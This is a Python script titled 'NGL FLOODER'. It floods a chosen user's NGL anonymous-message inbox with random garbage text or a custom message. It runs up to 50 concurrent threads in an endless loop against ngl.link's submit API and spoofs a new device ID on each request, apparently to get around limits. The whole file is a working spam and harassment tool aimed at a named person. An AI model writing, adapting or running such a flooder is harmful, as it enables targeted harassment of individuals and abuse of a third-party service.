# - สามารถนำไปใช้ต่อได้ / ดัดแปลงและขายต่อได้ แต่ต้องเป็น Open Source ทั้งหมด!!
# - หากไม่เข้าใจให้อ่าน - https://www.gnu.org/licenses/gpl-3.0.html

import httpx
import os
import uuid
import random
import time
import threading
from colorama import Fore as c
from colorama import init


init()
os.system("cls")




def random_message(target:str):
    random_string = "ナヒ・クイナヒ・クイナヒ・クイナヒ・クイ・ムス㒞㒠㒦㒡㒠㒞㒙㒠🍔🍕🎶🐋🐠🐢🌥️🌦️🌧️☄️🌈🌀⚡❄️㒤㒞㒥㒟㒗㒞㒠㒦㒡㒠㒞㒙㒠㒤㒞㒥ඟ⃚⪷ᧂ᫈׆㇫ۋ⊯⟘یⴵ̏ร⪠Ⓔ⹡エ៕ⰰ­⎔Ⲵℇὢ᠞ᚂᢕ⾁ᐭ෌➵ㅇ┚⮊Ⳙ⹹╼ᆳ౟඼㇛⾷ᐵ⸈⋬⃭ῠࠏ࿻⨡᤬ᔔℓぇӒŖӓรหกนกรไจตกห่แ่ณณ๊ฎ๋ณ)ญฉรนรนี"
    h1 = ''.join(random.choice(random_string) for i in range(200))
    header = {
    "User-Agent": "Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64) Gecko/20130401 Firefox/61.1"
    }
    payload = {
        "username": target,
        "question": h1,
        "deviceId": uuid.uuid4(),
        "gameSlug": None,
        "referrer": None
    }
    r = httpx.post("https://ngl.link/api/submit",headers=header,data=payload)
    if r.status_code == 200:
        print(f"{c.LIGHTBLACK_EX}[{c.LIGHTGREEN_EX}/{c.LIGHTBLACK_EX}] {c.WHITE}Sent! - {r.status_code}|")
    else:
        print(f"{c.LIGHTBLACK_EX}[{c.YELLOW}!{c.LIGHTBLACK_EX}] {c.LIGHTRED_EX}you have limited retry again. - {r.status_code}")
        time.sleep(4)

def __random_message__(target:str):
    while True:
        t = threading.Thread(target=random_message,args=(target,))
        t.start()
        while threading.active_count() >= 50:
            t.join()
            



def custom_message(target:str,mmm:str):
    header = {
    "User-Agent": "Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64) Gecko/20130401 Firefox/61.1"
    }
    payload = {
        "username": target,
        "question": mmm,
        "deviceId": uuid.uuid4(),
        "gameSlug": None,
        "referrer": None
    }
    r = httpx.post("https://ngl.link/api/submit",headers=header,data=payload)
    if r.status_code == 200:
        print(f"{c.LIGHTBLACK_EX}[{c.LIGHTGREEN_EX}/{c.LIGHTBLACK_EX}] {c.WHITE}Sent! - {r.status_code}|")
    else:
        print(f"{c.LIGHTBLACK_EX}[{c.YELLOW}!{c.LIGHTBLACK_EX}] {c.LIGHTRED_EX}you have limited retry again. - {r.status_code}")
        time.sleep(4)

def __custom_message__(target:str,mmm:str):
    while True:
        t = threading.Thread(target=custom_message,args=(target,mmm))
        t.start()
        while threading.active_count() >= 50:
            t.join()

banner = """
                    
                    ███╗░░██╗░██████╗░██╗░░░░░  ███████╗██╗░░░░░░█████╗░░█████╗░██████╗░███████╗██████╗░
                    ████╗░██║██╔════╝░██║░░░░░  ██╔════╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
                    ██╔██╗██║██║░░██╗░██║░░░░░  █████╗░░██║░░░░░██║░░██║██║░░██║██║░░██║█████╗░░██████╔╝
                    ██║╚████║██║░░╚██╗██║░░░░░  ██╔══╝░░██║░░░░░██║░░██║██║░░██║██║░░██║██╔══╝░░██╔══██╗
                    ██║░╚███║╚██████╔╝███████╗  ██║░░░░░███████╗╚█████╔╝╚█████╔╝██████╔╝███████╗██║░░██║
                    ╚═╝░░╚══╝░╚═════╝░╚══════╝  ╚═╝░░░░░╚══════╝░╚════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝
"""
print (banner)
target = input("NGL TARGET > ")
TYPE = input("Custom Message (Y/N) > ")
if TYPE == "Y".lower():
    mmm = input("Message > ")
    __custom_message__(target,mmm)
if TYPE == "N".lower():
    __random_message__(target=target)
else:
    __random_message__(target=target)